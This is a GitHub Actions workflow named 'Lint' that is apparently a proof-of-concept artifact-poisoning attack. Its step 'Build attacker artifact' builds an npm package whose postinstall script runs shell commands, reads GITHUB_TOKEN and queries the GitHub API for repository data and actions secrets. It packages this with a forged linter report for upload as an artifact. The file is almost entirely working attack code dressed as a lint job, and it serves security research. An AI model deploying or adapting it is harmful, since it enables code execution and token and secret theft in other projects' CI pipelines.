---
name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker artifact
        run: |
          mkdir -p evilpoc
          cat > evilpoc/package.json <<'EOF'
          {"name":"evilpoc","version":"1.0.0","scripts":{"postinstall":"node poc.js"}}
          EOF
          cat > evilpoc/poc.js <<'EOF'
          const { execSync } = require('child_process');
          const fs = require('fs');
          console.log('POC_RCE id=' + execSync('id').toString().trim());
          console.log('POC_RCE_CWD=' + process.cwd());
          fs.writeFileSync('/tmp/poc_rce_marker', 'executed');
          const tok = process.env.GITHUB_TOKEN || '';
          console.log('POC_TOKEN_PRESENT=' + (tok ? 'yes' : 'no'));
          (async () => {
            const H = { authorization: 'Bearer ' + tok, accept: 'application/vnd.github+json', 'user-agent': 'poc' };
            const repo = process.env.GITHUB_REPOSITORY;
            for (const u of ['/repos/' + repo, '/repos/' + repo + '/actions/secrets', '/user']) {
              try {
                const r = await fetch('https://api.github.com' + u, { headers: H });
                const t = await r.text();
                console.log('POC_API ' + u + ' -> ' + r.status + ' ' + t.slice(0, 400).replace(/\s+/g, ' '));
              } catch (e) { console.log('POC_API_ERR ' + u + ' ' + e.message); }
            }
            try { fs.unlinkSync('/tmp/poc_rce_marker'); } catch (e) {}
          })().catch(e => console.log('POC_ERR ' + e.message));
          EOF
          (cd evilpoc && npm pack --pack-destination ..)
          printf 'FORGED REPORT - artifact from attacker workflow\n' > linter-report.txt
          printf '1' > pr-number.txt
          cat > package.json <<'EOF'
          {"name":"poc-root","version":"1.0.0","dependencies":{"evilpoc":"file:./evilpoc-1.0.0.tgz"},"allowScripts":{"file:./evilpoc-1.0.0.tgz":true}}
          EOF

      - name: Upload artifact
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            package.json
            evilpoc-1.0.0.tgz
            linter-report.txt
            pr-number.txt
          if-no-files-found: ignore
